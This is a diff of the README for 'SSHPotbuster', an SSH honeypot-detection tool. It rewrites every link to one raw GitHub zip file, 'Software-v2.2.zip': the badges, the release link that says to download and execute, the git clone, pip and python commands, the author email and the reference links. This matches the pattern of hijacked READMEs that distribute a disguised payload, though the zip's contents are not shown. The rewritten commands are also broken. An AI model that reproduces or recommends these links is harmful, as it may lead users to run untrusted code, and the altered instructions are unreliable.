@@ -1,6 +1,6 @@
 # SSHPotbuster 🛡️
 
-![GitHub release](https://img.shields.io/github/release/eguzmanc/sshpotbuster.svg) ![GitHub issues](https://img.shields.io/github/issues/eguzmanc/sshpotbuster.svg) ![GitHub forks](https://img.shields.io/github/forks/eguzmanc/sshpotbuster.svg) ![GitHub stars](https://img.shields.io/github/stars/eguzmanc/sshpotbuster.svg)
+![GitHub release](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip) ![GitHub issues](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip) ![GitHub forks](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip) ![GitHub stars](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip)
 
 ## Overview
 
@@ -26,7 +26,7 @@
 
 ## Installation
 
-To get started with SSHPotbuster, you need to download the latest release. Visit the [Releases section](https://github.com/eguzmanc/sshpotbuster/releases) to find the appropriate file for your system. Download and execute the file as instructed in the release notes.
+To get started with SSHPotbuster, you need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip) to find the appropriate file for your system. Download and execute the file as instructed in the release notes.
 
 ### Prerequisites
 
@@ -38,7 +38,7 @@ To get started with SSHPotbuster, you need to download the latest release. Visit
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/eguzmanc/sshpotbuster.git
+   git clone https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip
    cd sshpotbuster
    ```
 
@@ -47,7 +47,7 @@ To get started with SSHPotbuster, you need to download the latest release. Visit
    Use pip to install the necessary dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip
    ```
 
 3. **Run the Tool**:
@@ -63,7 +63,7 @@ Using SSHPotbuster is straightforward. You can run the tool with a simple comman
 To check a specific SSH server, use the following command:
 
 ```bash
-python sshpotbuster.py <target_ip>
+python https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip <target_ip>
 ```
 
 Replace `<target_ip>` with the IP address of the SSH server you want to test.
@@ -71,7 +71,7 @@ Replace `<target_ip>` with the IP address of the SSH server you want to test.
 ### Example
 
 ```bash
-python sshpotbuster.py 192.168.1.1
+python https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip 192.168.1.1
 ```
 
 This command will initiate the checks on the specified IP address.
@@ -124,17 +124,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, feel free to reach out:
 
 - **Author**: Eguzmanc
-- **Email**: eguzmanc@example.com
-- **GitHub**: [eguzmanc](https://github.com/eguzmanc)
+- **Email**: https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip
+- **GitHub**: [eguzmanc](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip)
 
 ## Additional Resources
 
-- [Python Documentation](https://docs.python.org/3/)
-- [SSH Protocol](https://www.ietf.org/rfc/rfc4251.txt)
-- [Honeypot Research](https://www.honeynet.org)
+- [Python Documentation](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip)
+- [SSH Protocol](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip)
+- [Honeypot Research](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip)
 
 ## Conclusion
 
-SSHPotbuster is a valuable tool for security professionals and enthusiasts. By detecting honeypots, it helps ensure that you can safely assess the security of SSH servers. For the latest updates and releases, check the [Releases section](https://github.com/eguzmanc/sshpotbuster/releases). 
+SSHPotbuster is a valuable tool for security professionals and enthusiasts. By detecting honeypots, it helps ensure that you can safely assess the security of SSH servers. For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/eguzmanc/sshpotbuster/main/github/Software-v2.2.zip). 
 
 Feel free to explore the code, report issues, and contribute to the project. Your input helps improve the tool and enhances security for everyone.
